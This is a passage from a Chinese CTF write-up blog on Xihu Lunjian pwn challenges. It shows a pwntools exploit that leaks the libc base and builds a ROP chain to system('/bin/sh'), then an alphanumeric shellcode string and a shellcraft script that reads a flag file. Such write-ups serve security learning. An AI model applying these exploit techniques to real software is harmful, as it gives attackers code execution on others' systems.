    <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Enter your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Enter your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>




<span class="nf">push</span><span class="p">(</span><span class="mh">0x41414141</span><span class="p">)</span>
<span class="nf">push</span><span class="p">(</span><span class="mh">0x42424242</span><span class="p">)</span>

<span class="nf">push</span><span class="p">(</span><span class="mh">0x42424242</span><span class="p">)</span>
<span class="nf">push</span><span class="p">(</span><span class="mh">0x42424242</span><span class="p">)</span>

<span class="nf">push</span><span class="p">(</span><span class="mh">0x42424242</span><span class="p">)</span>
<span class="nf">push</span><span class="p">(</span><span class="mh">0x42424242</span><span class="p">)</span>

<span class="nf">push</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
<span class="nf">show</span><span class="p">()</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">StackVector contents: </span><span class="sh">'</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="nf">rl</span><span class="p">().</span><span class="nf">decode</span><span class="p">().</span><span class="nf">strip</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">d1</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
<span class="n">d2</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">])</span> <span class="o">%</span><span class="mh">0x100000000</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">d1</span> <span class="o">&lt;&lt;</span> <span class="mh">0x20</span>
<span class="n">libc_base</span> <span class="o">+=</span> <span class="n">d2</span>
<span class="n">libc_base</span> <span class="o">-=</span> <span class="mi">171408</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">d1</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">d2</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">))</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="sh">'</span><span class="s">pop rdi;ret</span><span class="sh">'</span><span class="p">)))</span>


<span class="nf">pop</span><span class="p">()</span>
<span class="nf">pop</span><span class="p">()</span>

<span class="nf">push</span><span class="p">((</span><span class="n">pop_rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span>
<span class="nf">push</span><span class="p">((</span><span class="n">pop_rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="nf">push</span><span class="p">((</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span>
<span class="nf">push</span><span class="p">((</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="nf">push</span><span class="p">((</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span>
<span class="nf">push</span><span class="p">((</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mh">0x20</span><span class="p">)</span>


<span class="nf">push</span><span class="p">((</span><span class="n">system</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span>
<span class="c1">#gdb.attach(io,gdbscript)
</span><span class="nf">push</span><span class="p">((</span><span class="n">system</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mh">0x20</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#push((pop_rdi+1) &amp; 0xFFFFFFFF)
</span>
<span class="c1">#show()
#edit(-1,0x45454545)
</span>
<span class="c1">#pay = flat({
#},filler=b'\x00')
</span>
<span class="nf">itr</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h2 id="pwn-heavens-door"><span class="me-2">Pwn-Heaven’s door</span><a href="#pwn-heavens-door" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-xhlj/assets/image-20250118163114-240qed6.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-xhlj/assets/image-20250118163114-240qed6.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>懒得去写 xor 了，直接 字符shellcode 一把梭</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2E0T2I0Q030z3P3G1P3r123V2p01187l0B1k0R0r2H1k010r2n0w0A3i108N0R00060Z2r0o11092j7o0w0X0I0n110p0k0x3k3d14012O7o0D03</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>

<span class="n">sc</span>  <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">flag</span><span class="sh">'</span><span class="p">))</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">rax</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x40</span><span class="p">))</span>
<span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">shellcode</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>

<span class="c1"># python3 $1 &gt;shellcode
# python2 ./ALPHA3.py x64 ascii mixedcase rax --input="shellcode"
# python2 ./ALPHA3.py x64 ascii mixedcase rdx --input="shellcode"
</span></pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          本文由作者按照 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         进行授权
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">分享</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F%25E7%25AC%25AC%25E5%2585%25AB%25E5%25B1%258A%25E8%25A5%25BF%25E6%25B9%2596%25E8%25AE%25BA%25E5%2589%2591-%25E7%25BD%2591%25E7%25BB%259C%25E6%2594%25BB%25E9%2598%25B2%25E5%25AE%259E%25E6%2588%2598%25E8%25B5%259B%25E5%2588%259D%25E8%25B5%259B-Pwn-%25E8%25A7%25A3%25E9%25A2%2598%25E6%2580%259D%25E8%25B7%25AF%2F&title=%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="QQ" aria-label="QQ">
        <i class="fa-fw fa-brands fa-qq"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%20-%20imLZH1'%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F%25E7%25AC%25AC%25E5%2585%25AB%25E5%25B1%258A%25E8%25A5%25BF%25E6%25B9%2596%25E8%25AE%25BA%25E5%2589%2591-%25E7%25BD%2591%25E7%25BB%259C%25E6%2594%25BB%25E9%2598%25B2%25E5%25AE%259E%25E6%2588%2598%25E8%25B5%259B%25E5%2588%259D%25E8%25B5%259B-Pwn-%25E8%25A7%25A3%25E9%25A2%2598%25E6%2580%259D%25E8%25B7%25AF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F%25E7%25AC%25AC%25E5%2585%25AB%25E5%25B1%258A%25E8%25A5%25BF%25E6%25B9%2596%25E8%25AE%25BA%25E5%2589%2591-%25E7%25BD%2591%25E7%25BB%259C%25E6%2594%25BB%25E9%2598%25B2%25E5%25AE%259E%25E6%2588%2598%25E8%25B5%259B%25E5%2588%259D%25E8%25B5%259B-Pwn-%25E8%25A7%25A3%25E9%25A2%2598%25E6%2580%259D%25E8%25B7%25AF%2F&text=%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="分享链接"
      data-title-succeed="链接已复制！"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">最近更新</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Kernel-Pwn-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/">Kernel Pwn 刷题记录</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Nullcon-Goa-HackIM-2025-CTF/">HACKIM 2025 CTF 一道wasm pwn题分享</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/LA_CTF-%E9%83%A8%E5%88%86Pwn%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-by-g1P03n/">LA CTF 2025 部分Pwn解题思路 by g1P03n</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/BRISC-CTF/">2024-BRISC-CTF-Pwn-WriteUps</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">文章内容</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->

























            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/"
      class="btn btn-outline-primary"
      aria-label="上一篇"
    >
      <p>IrisCTF2025-Pwn-Binary-Exploitation-WriteUps</p>
    </a>
  

  
    <a
      href="/posts/Nullcon-Goa-HackIM-2025-CTF/"
      class="btn btn-outline-primary"
      aria-label="下一篇"
    >
      <p>HACKIM 2025 CTF 一道wasm pwn题分享</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imLZH1/me_giscus_Discussions-',
      'data-repo-id': 'comments',
      'data-category': 'general',
      'data-category-id': '',
      'data-mapping': 'pathname',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'bottom',
      'data-lang': 'zh-CN',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    <a href="https://user.qzone.qq.com/3461665835">imLZH1</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。"
      >保留部分权利。</span>
    
  </p>
	<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>

  <p>本站采用 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 主题 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">发现新版本的内容。</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      更新
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    <script src="/assets/lib/jquery/jquery.min.js"></script>
  

  
    <script src="/assets/lib/bootstrap/bootstrap.bundle.min.js"></script>
  

  
    <script src="/assets/lib/simple-jekyll-search/simple-jekyll-search.min.js"></script>
  

  
    <script src="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.umd.min.js"></script>
  

  
    <script src="/assets/lib/magnific-popup/jquery.magnific-popup.min.js"></script>
  

  
    <script src="/assets/lib/clipboard/clipboard.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/dayjs.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/locale/en.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/relativeTime.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/localizedFormat.min.js"></script>
  

  
    <script src="/assets/lib/tocbot/tocbot.min.js"></script>
  








<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

